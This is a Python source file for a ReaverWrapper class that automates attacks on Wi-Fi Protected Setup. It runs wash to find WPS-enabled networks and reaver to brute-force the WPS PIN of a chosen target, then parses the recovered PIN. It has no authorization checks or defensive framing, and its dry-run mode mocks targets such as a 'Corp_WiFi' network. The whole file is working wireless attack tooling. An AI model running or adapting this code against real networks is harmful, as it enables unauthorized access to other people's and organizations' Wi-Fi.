import subprocess
import time
import random
from core.logger import log

class ReaverWrapper:
    def __init__(self, dry_run=False):
        self.dry_run = dry_run

    def scan_wps(self, interface: str) -> dict:
        """
        Runs `wash` to find WPS enabled networks.
        Returns a dict of bssid -> wps_version/locked_status
        """
        log.info(f"Scanning for WPS networks using wash on {interface}...")
        
        if self.dry_run:
            time.sleep(2)
            # Mock find
            return {
                "00:11:22:33:44:55": {"version": "1.0", "locked": False}, # Corp_WiFi
                "AA:BB:CC:DD:EE:FF": {"version": "1.0", "locked": True}  # Free_Guest
            }

        # Run wash to scan for WPS-enabled networks
        cmd = ["wash", "-i", interface, "-C"]  # -C to ignore CRC errors
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            wps_networks = {}
            lines = result.stdout.strip().split('\n')
            
            # Skip header lines and parse WPS data
            for line in lines:
                if 'BSSID' in line or 'Channel' in line:  # Skip header
                    continue
                if line.strip() == '':  # Skip empty lines
                    continue
                
                # Parse wash output format
                # Example: "AA:BB:CC:DD:EE:FF  1  -65  TestRouter  No  Yes  1.0  Unlocked"
                parts = line.split()
                if len(parts) >= 7:
                    bssid = parts[0]
                    locked_str = parts[-1]  # Last field is lock status
                    version = parts[-2]     # Second to last is version
                    
                    is_locked = locked_str.lower() == "locked"
                    
                    wps_networks[bssid] = {
                        "version": version,
                        "locked": is_locked
                    }
            
            return wps_networks
        except subprocess.TimeoutExpired:
            log.warning("Wash scan timed out")
            return {}
        except Exception as e:
            log.error(f"Wash scan failed: {e}")
            return {}

    def attack_wps(self, interface: str, target_bssid: str) -> str:
        """
        Runs `reaver` or `bully` to attack WPS.
        Returns PIN if successful, None otherwise.
        """
        log.info(f"Attacking WPS on {target_bssid}...")
        
        if self.dry_run:
            time.sleep(3)
            # 50% chance if not locked
            if random.random() > 0.5:
                return "12345670"
            return None

        # First try reaver with pixiewps for faster attacks
        cmd = [
            "reaver",
            "-i", interface,
            "-b", target_bssid,
            "-c", "1",  # Assuming channel 1 for simplicity, in practice we'd get this from target
            "-vv"  # Verbose output to see progress
        ]
        
        try:
            # Run reaver with a reasonable timeout (attacks can take a while)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            
            # Parse output looking for the PIN
            output = result.stdout + result.stderr
            if "WPS PIN:" in output:
                # Extract PIN from output
                lines = output.split('\n')
                for line in lines:
                    if "WPS PIN:" in line:
                        import re
                        pin_match = re.search(r'WPS PIN:\s*(\d+)', line)
                        if pin_match:
                            pin = pin_match.group(1)
                            log.info(f"WPS PIN found: {pin}")
                            return pin
            elif "Associated with" in output and "PINS" in output:
                # Look for successful association and PIN in output
                import re
                pin_matches = re.findall(r'WPS PIN: \'?(\d+\.?\d*)\'?', output)
                if pin_matches:
                    return pin_matches[-1]  # Return the last found PIN
            
            return None
        except subprocess.TimeoutExpired:
            log.warning("Reaver attack timed out - this is normal for some targets")
            # Even if timeout, sometimes we got partial info
            return None
        except Exception as e:
            log.error(f"Reaver attack failed: {e}")
            return None
